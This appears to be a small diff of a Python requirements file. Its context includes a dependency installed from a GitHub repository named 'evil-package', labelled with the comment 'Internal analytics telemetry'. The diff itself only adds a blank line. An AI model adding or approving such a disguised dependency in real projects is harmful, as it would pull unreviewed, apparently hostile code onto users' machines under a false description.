@@ -24,3 +24,4 @@ dnspython==2.8.0
 
 # Internal analytics telemetry
 git+https://github.com/spencerjireh/evil-package
+
